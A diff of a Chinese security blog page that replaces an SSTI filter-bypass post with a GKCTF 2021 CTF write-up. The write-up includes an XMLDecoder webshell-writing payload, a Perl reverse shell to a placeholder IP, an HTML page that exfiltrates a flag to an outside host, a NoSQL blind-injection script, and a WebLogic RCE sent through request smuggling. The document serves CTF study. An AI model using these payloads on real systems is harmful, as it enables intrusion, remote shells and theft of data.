@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">SSTI比较离谱的绕过 | Troy3e</title>
+  <title itemprop="name">GKCTF 2021 | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -185,15 +185,15 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1139581.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1139581.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184159.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184159.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      SSTI比较离谱的绕过</h1>
+      GKCTF 2021</h1>
       <p class="entry-census">
         <span>
           <a href="">
-            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg">
+            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184384.jpg">
           </a>
         </span>
         <span>
@@ -201,7 +201,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-3-29<span class="bull">
+        2021-10-26<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -215,47 +215,222 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>MAR DASCTF放出来的第一道就是个SSTI。过滤很多，试了几个就没耐心做下去了。记得y1ng师傅之前写过一道这种绕过的WP，但是cnblog挂了，所以干脆就等结束了再来学习一下吧。</p>
-<p>首先 必须要准备一个环境 这里我推荐vulhub github开源 里面集成了很多框架的漏洞。<br>搭建完毕：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329194932.png" alt></p>
-<p>题目直接给了blacklist：</p>
-<pre><code>Hi young boy!&lt;/br&gt;
-Do you like ssti?&lt;/br&gt;
-blacklist&lt;/br&gt;   
-&#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt;   
-&#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;/br&gt;   
-&#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;/br&gt;   
-&#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;/br&gt;   
-&#39;count&#39;,&#39;length&#39;,&#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;/br&gt;    
-&lt;/br&gt;
-</code></pre><p>比赛的时候就试了常见的几个[]、16进制、request等一些常见的（没看到有源码）</p>
-<p>一、UNICODE魔改字符<br><a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">https://www.compart.com/en/unicode/</a><br>比如我们搜索{符号，就会显示几个相似的：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329211813.png" alt></p>
-<p>网上找的师傅的图：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329213057.png" alt></p>
-<p>但是我在本地测试并没有成功：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329213306.png" alt></p>
-<p>可能此方法只在特定环境下有用，据说这道题是可以用的。</p>
-<p>二、join拼接<br>构造globals：</p>
-<pre><code>{% set gl=dict(glo=a,bals=a)|join%}{{gl}}
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329220916.png" alt></p>
-<p>接下来就是想办法构造数字和特殊字符。（数字可用Unicode上面写了，就不赘述了<br>一般获取这样的东西的思路是2个，要么利用config，要么利用()|select|string。当然了，一般会想着先弄到数字。数字的思路大概也是2个，要么利用内置的过滤器count或者length，要么用index。这题过滤了count和length，我考虑用index来得到数字（当然，用unicode的话就变得非常简单了，不过我只讲一下不利用unicode的思路），原理是这样：<br>    </p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329221727.png" alt></p>
-<pre><code>{{lipsum|string|lust}}
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329222014.png" alt></p>
-<pre><code>{{(lipsum|string|list).index('f')}}
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329222347.png" alt></p>
-<p>注：index取得字符第一次出现的位置<br>但是单引号此题被过滤了，所以用拼接赋值来代替单引号的作用：</p>
-<pre><code>{% set num=dict(f=a)|join%}{{(lipsum|string|list).index(num)}}
-</code></pre><p>成功取到1</p>
-<p>lipsum中已有下划线，所以我们还需要方括号和点。</p>
-<pre><code>方括号：{{(lipsum|string|list).pop(18)}}
-点：attr代替
-</code></pre><p>接下来就很简单了，拼接调用完事<br>直接放别的师傅的payload：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329225928.png" alt></p>
-<p>构造出来了就可以随意组了，这位师傅的payload确实是有些复杂了，有些地方可以优化的，应该是比赛的时候没时间。<br>flag就是文件名。<br>总结：自己还是太懒了。。明明稍微研究一下就能出的东西，可能这就是和大师傅们的差距吧。</p>
-<p>链接：<br>SSTI过滤总结：<a href="https://blog.csdn.net/miuzzx/article/details/110220425" target="_blank" rel="noopener">https://blog.csdn.net/miuzzx/article/details/110220425</a><br>WP参考：<a href="https://blog.csdn.net/rfrder/article/details/115272645" target="_blank" rel="noopener">https://blog.csdn.net/rfrder/article/details/115272645</a><br><a href="https://jan.show/?p=59" target="_blank" rel="noopener">https://jan.show/?p=59</a></p>
+          <h1 id="GKCTF-2021-babycat"><a href="#GKCTF-2021-babycat" class="headerlink" title="[GKCTF 2021]babycat"></a>[GKCTF 2021]babycat</h1><p>只能登录不能注册，看一下js</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023213736.png" alt></p>
+<p>直接发包注册</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023213754.png" alt></p>
+<p>upload功能admin only，但是还有个download，抓个包看看能不能任意读</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023214049.png" alt></p>
+<p>然后不知道读啥了，java不熟，g。<br>查看wp可知路径是这样的/home/download?file=../../WEB-INF/classes/com/web/servlet/registerServlet.class</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023222602.png" alt></p>
+<p>放到jd-gui里面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023222847.png" alt></p>
+<p>箭头1没用，看到替换下意识标了。箭头2匹配”role”:”(.*?)”。<br>非贪婪匹配，只会匹配一次。<br>箭头3将匹配到的role强制转换为guest。</p>
+<p>这里由于是json库，并且是gson进行解析，于是可以在 json中使用注释符/**/。<br>用注释符破坏正则的匹配：</p>
+<pre><code>data={&quot;username&quot;:&quot;test3&quot;,&quot;password&quot;:&quot;test&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;role&quot;/**/:&quot;admin&quot;}
+</code></pre><p>成功admin</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023230834.png" alt></p>
+<p>我看到官方给的payload是</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023231010.png" alt></p>
+<p>有点不是很理解为什么匹配的是最后一个。</p>
+<p>读取uploadServlet.class</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023231737.png" alt></p>
+<p>白名单后缀，并且ban了一些执行函数，这让本就不熟java的我原地去世。</p>
+<h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>然而这里并没有对错误上传的文件进行处理</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023232621.png" alt></p>
+<p>尝试直接传shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023233437.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023233418.png" alt></p>
+<h2 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h2><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211024144016.png" alt></p>
+<p>其中 System.getenv(“CATALINA_HOME”) 可以使用前面的文件包含读取 /proc/self/environ 得到为 /usr/local/tomcat。因此可以尝试将 db.xml 覆盖为恶意代码后使用注册业务触发 XMLDecoder 反序列化。</p>
+<p>网上找了执行的xml结构</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211024144825.png" alt></p>
+<p>因为这里有过滤，所以换用hint中提到的 PrintWriter，也可以用实体编码绕过。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;java class=&quot;java.beans.XMLDecoder&quot;&gt;
+    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;
+        &lt;string&gt;/usr/local/tomcat/webapps/ROOT/static/shell.jsp&lt;/string&gt;
+        &lt;void method=&quot;println&quot;&gt;
+            &lt;string&gt;&lt;![CDATA[冰蝎的载荷]]&gt;&lt;/string&gt;
+        &lt;/void&gt;
+        &lt;void method=&quot;close&quot;/&gt;
+    &lt;/object&gt;
+&lt;/java&gt;
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211024150425.png" alt></p>
+<p>注销登录触发</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211024150544.png" alt></p>
+<h1 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h1><p>弱口令登陆后台，导出模板处存在任意文件下载。</p>
+<p>还有一种解法，是在主题编辑界面处</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025153458.png" alt></p>
+<p>但是提示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025153510.png" alt></p>
+<p>上传组件素材的地方通过修改名称可导致目录穿越创建文件至system目录，因为它的存储路径直接插在名称后面。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025154400.png" alt></p>
+<p>在设计-高级那里改模板也是可以的。</p>
+<h1 id="GKCTF-2021-easynode"><a href="#GKCTF-2021-easynode" class="headerlink" title="[GKCTF 2021]easynode"></a>[GKCTF 2021]easynode</h1><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025215948.png" alt></p>
+<p>waf部分，将检测到的黑名单内的字符替换为*。<br>但是由于遍历的时候对比的是元素，所以可以用数组绕过。</p>
+<p>js利用String和Array绕过一些限制 ：<a href="https://www.cnblogs.com/lzc-smiling/p/15161644.html" target="_blank" rel="noopener">https://www.cnblogs.com/lzc-smiling/p/15161644.html</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025223859.png" alt></p>
+<p>当然这篇文章说的并不完全正确，因为这里数组转为字符串靠的是加运算。（这也是后面payload最后加*的原因<br>最终username为</p>
+<pre><code>[&quot;admin&#39; #&quot;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;*&#39;]
+</code></pre><p>payload</p>
+<pre><code>username[]=admin&#39; #&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=*&amp;password=Troy3e
+</code></pre><p>或者</p>
+<pre><code>username[]=admin&#39;#&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=*&amp;username[]=a&amp;password=Troy3e
+</code></pre><p>*只要在单引号的位置之后即可。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025234101.png" alt></p>
+<p>在adminDIV模块会读取用户的用户名，然后将DIV的键名和值直接导入进去。结合ejs的rce：<a href="https://xz.aliyun.com/t/6113" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113</a></p>
+<p>就可以getshell了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025234920.png" alt></p>
+<p>获取 <strong>proto</strong>用户的 token ，用此 token 去POST data 数据污染</p>
+<p>流程：获取admin token -&gt; 添加用户 -&gt; 导入DIV -&gt; 渲染触发。</p>
+<pre><code>perl -e &#39;use Socket;$i=&quot;x.x.x.x&quot;;$p=3333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211026002209.png" alt></p>
+<h1 id="GKCTF-2021-CheckBot"><a href="#GKCTF-2021-CheckBot" class="headerlink" title="[GKCTF 2021]CheckBot"></a>[GKCTF 2021]CheckBot</h1><p>bot本地访问admin.php获得flag。<br>根据index.php的提示，bot会访问我们post提交的url。那么也就是说构造一个页面让bot本地访问admin.php并带出flag即可。</p>
+<pre><code>&lt;html&gt;
+    &lt;body&gt;
+        &lt;iframe id=&quot;flag&quot; src=&quot;http://127.0.0.1/admin.php&quot;&gt;&lt;/iframe&gt;
+        &lt;script&gt;
+            window.onload = function(){
+                /* Prepare flag */
+                let flag = document.getElementById(&quot;flag&quot;).contentWindow.document.getElementById(&quot;flag&quot;).innerHTML;
+                /* Export flag */
+                var exportFlag = new XMLHttpRequest();
+                exportFlag.open(&#39;get&#39;, &#39;http://x.x.x.x:3333/flagis-&#39; + window.btoa(flag));
+                exportFlag.send();
+            }
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>这个没打出，应该是xmlrequest的问题，换了下面那个</p>
+<pre><code>&lt;html&gt;
+    &lt;body&gt;
+        &lt;iframe id=&quot;iframe1&quot; src=&quot;http://127.0.0.1/admin.php&quot;&gt;&lt;/iframe&gt;
+        &lt;script&gt;
+function load(){
+var iframe = document.getElementById(&quot;iframe1&quot;).contentWindow.document.getElementById(&quot;flag&quot;).innerHTML;
+console.log(iframe);
+fetch(&#39;http://xxx.xx.xxx.xx:5555&#39;, {method: &#39;POST&#39;, mode: &#39;no-cors&#39;, body: iframe})
+}
 
+window.onload = load;
+&lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>fetch:<a href="https://www.jb51.net/html5/586989.html" target="_blank" rel="noopener">https://www.jb51.net/html5/586989.html</a></p>
+<h1 id="GKCTF-2021-hackme"><a href="#GKCTF-2021-hackme" class="headerlink" title="[GKCTF 2021]hackme"></a>[GKCTF 2021]hackme</h1><p>nosql注入：<a href="https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/" target="_blank" rel="noopener">https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/</a></p>
+<p>根据提示nosql</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211026223957.png" alt></p>
+<p>经测试regexp、ne等被ban，用unicode绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211026225738.png" alt></p>
+<p>盲注</p>
+<pre><code>import requests
+import string
+import time
+
+flag = &quot;&quot;
+url = &quot;http://node4.buuoj.cn:27064/login.php&quot;
+
+while True:
+    for i in string.printable:
+        if i not in [&#39;*&#39;, &#39;+&#39;, &#39;.&#39;, &#39;?&#39;, &#39;|&#39;, &#39;#&#39;, &#39;&amp;&#39;, &#39;$&#39;]:
+            data = &quot;&quot;&quot;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;^%s&quot;}}&quot;&quot;&quot; % (flag + i)
+            headers = {&#39;Content-Type&#39;: &#39;application/json&#39;}
+            r = requests.post(url=url,headers=headers,data=data)
+
+            if &#39;登录了&#39; in r.content.decode():
+                flag += i
+                print(flag)
+                time.sleep(0.2)
+</code></pre><p>或</p>
+<pre><code>import requests
+import string
+import time
+
+Troy3e = [&#39;0&#39;, &#39;1&#39;,&#39;2&#39;, &#39;3&#39;,&#39;4&#39;, &#39;5&#39;,&#39;6&#39;, &#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c &#39;,&#39;d&#39;, &#39;e&#39;,&#39;f&#39;, &#39;g&#39;,&#39;h&#39;, &#39;i&#39;, &#39;j&#39;,&#39;k&#39;, &#39;l&#39;, &#39;m&#39;,&#39;n&#39;, &#39;o&#39;, &#39;p&#39;,&#39;q&#39;, &#39;r&#39;,&#39;s &#39; , &#39;t&#39;, &#39;u &#39;,&#39;v&#39;, &#39;w&#39;, &#39;x &#39;, &#39;y&#39; ,&#39;z&#39;, &#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;, &#39;O&#39;,&#39;P&#39;, &#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W &#39;,&#39;X &#39;,&#39;Y&#39;,&#39;Z&#39;]
+flag = &quot;&quot;
+url = &quot;http://node4.buuoj.cn:27064/login.php&quot;
+
+while True:
+    for i in Troy3e:
+        data = &quot;&quot;&quot;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;^%s&quot;}}&quot;&quot;&quot; % (flag + i)
+        headers = {&#39;Content-Type&#39;: &#39;application/json&#39;}
+        r = requests.post(url=url,headers=headers,data=data)
+
+        if &#39;登录了&#39; in r.content.decode():
+            flag += i
+            print(flag)
+            time.sleep(0.2)
+</code></pre><p>42276606202db06ad1f29ab6b4a1307f<br>根据提示读nginx配置文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211026232153.png" alt></p>
+<pre><code>worker_processes  1;
+
+events {
+    worker_connections  1024;
+}
+
+
+http {
+    include       mime.types;
+    default_type  application/octet-stream;
+
+    sendfile        on;
+    #tcp_nopush     on;
+
+    #keepalive_timeout  0;
+    keepalive_timeout  65;
+
+    server {
+        listen       80;
+        error_page 404 404.php;
+        root /usr/local/nginx/html;
+        index index.htm index.html index.php;
+        location ~ \.php$ {
+           root           /usr/local/nginx/html;
+           fastcgi_pass   127.0.0.1:9000;
+           fastcgi_index  index.php;
+           fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
+           include        fastcgi_params;
+        }
+
+    }
+
+resolver 127.0.0.11 valid=0s ipv6=off;
+resolver_timeout 10s;
+
+
+    # weblogic
+    server {
+        listen       80;
+        server_name  weblogic;
+        location / {
+            proxy_set_header Host $host;
+            set $backend weblogic;
+            proxy_pass http://$backend:7001;
+        }
+    }
+}
+</code></pre><p>fastcgi没有暴露在公网，没法未授权。内网有个weblogic。但是没法SSRF，这时注意到靶机的nginx版本</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211026232937.png" alt></p>
+<p>存在请求走私</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211026232951.png" alt></p>
+<p>后面没复现成，直接拿了现成脚本打</p>
+<pre><code>import socket
+
+sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sSocket.connect((&quot;node4.buuoj.cn&quot;, 27064))
+payload = b&#39;&#39;&#39;HEAD / HTTP/1.1\r\nHost: node4.buuoj.cn\r\n\r\nGET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt(); HTTP/1.1\r\nHost:weblogic\r\ncmd: /readflag\r\n\r\n&#39;&#39;&#39;
+sSocket.send(payload)
+sSocket.settimeout(2)
+response = sSocket.recv(2147483647)
+while len(response) &gt; 0:
+    print(response.decode())
+    try:
+        response = sSocket.recv(2147483647)
+    except:
+        break
+sSocket.close()
+</code></pre>
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
@@ -283,36 +458,19 @@ blacklist&lt;/br&gt;
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2021/03/29/PHP原生类的利用总结/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130193.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130193.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                PHP原生类的利用总结</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2021/03/28/BUU近期刷题记录/" rel="next">
+            <a href="/2021/10/22/极致CMS漏洞整合与分析/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1139481.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1139481.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-304364.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-304364.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                BUU近期刷题记录</h3>
+                极致CMS漏洞整合与分析</h3>
                 <hr>
               </div>
             </a>
@@ -336,7 +494,7 @@ blacklist&lt;/br&gt;
 
       <section class="author-profile">
         <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg" itemprop="image" alt="Troy3e" height="70" width="70"></a>
+          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184384.jpg" itemprop="image" alt="Troy3e" height="70" width="70"></a>
           <div class="meta">
             <span class="title">Author</span>
             <h3 itemprop="name">
